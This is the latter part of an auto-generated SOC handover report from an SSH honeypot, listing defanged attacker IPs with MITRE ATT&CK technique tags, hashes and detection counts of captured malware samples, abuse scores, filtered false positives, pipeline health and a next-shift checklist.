| `117.245.138[.]225` | 1 | 2026-06-15 03:11 | 2026-06-15 03:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.196.30[.]45` | 1 | 2026-06-15 01:24 | 2026-06-15 01:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.240.188[.]136` | 1 | 2026-06-15 01:42 | 2026-06-15 01:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]115` | 1 | 2026-06-15 00:34 | 2026-06-15 00:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]85` | 1 | 2026-06-15 01:18 | 2026-06-15 01:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `168.167.228[.]123` | 1 | 2026-06-15 00:00 | 2026-06-15 00:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.178[.]165` | 1 | 2026-06-15 02:20 | 2026-06-15 02:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.115.147[.]5` | 1 | 2026-06-15 03:55 | 2026-06-15 03:55 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.161.101[.]131` | 1 | 2026-06-15 01:13 | 2026-06-15 01:13 | 3s | 0 | `T1592` | 🟢 LOW |
| `218.0.56[.]30` | 1 | 2026-06-15 01:16 | 2026-06-15 01:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.127.251[.]23` | 1 | 2026-06-15 03:23 | 2026-06-15 03:23 | 12s | 0 | `T1592` | 🟢 LOW |
| `27.215.132[.]213` | 1 | 2026-06-15 02:02 | 2026-06-15 02:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `41.153.30[.]115` | 1 | 2026-06-15 01:12 | 2026-06-15 01:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.156.129[.]95` | 1 | 2026-06-15 02:10 | 2026-06-15 02:10 | 8s | 0 | `T1592` | 🟢 LOW |
| `47.236.83[.]218` | 1 | 2026-06-15 03:57 | 2026-06-15 03:58 | 30s | 0 | `T1592` | 🟢 LOW |
| `78.83.249[.]54` | 1 | 2026-06-15 03:46 | 2026-06-15 03:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.92.42[.]158` | 1 | 2026-06-15 00:14 | 2026-06-15 00:15 | 59s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `157.230.150[.]187` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `125.240.188[.]136` | KR | DACOM-PUBNETPLUS | **100** ⚠️ | 42 |
| `142.93.48[.]137` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `27.215.132[.]213` | CN | China Unicom Shandong province network | **100** ⚠️ | 3 |
| `110.14.190[.]217` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `222.127.251[.]23` | PH | Globe Telecom/Innove Communication | **100** ⚠️ | 8 |
| `181.115.147[.]5` | BO | Entel S.A. - EntelNet | **100** ⚠️ | 50 |
| `118.253.182[.]187` | CN | CHINANET Hunan province network | **100** ⚠️ | 3 |
| `78.83.249[.]54` | BG | Broadband Services | **100** ⚠️ | 47 |
| `101.188.61[.]55` | AU | Telstra Limited | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 345 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 191 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 110 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 58 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 58 |

---

## 🔕 False Positive Summary (71 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 68 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 474 cases |
| Tool 34  | Credential Extractor        | ✅ 304 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 47 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 71 filtered (15.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 110 priority case(s) shown individually · 39 recon entry/entries in table (17 group(s) consolidating 271 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-15T04:48:11Z_
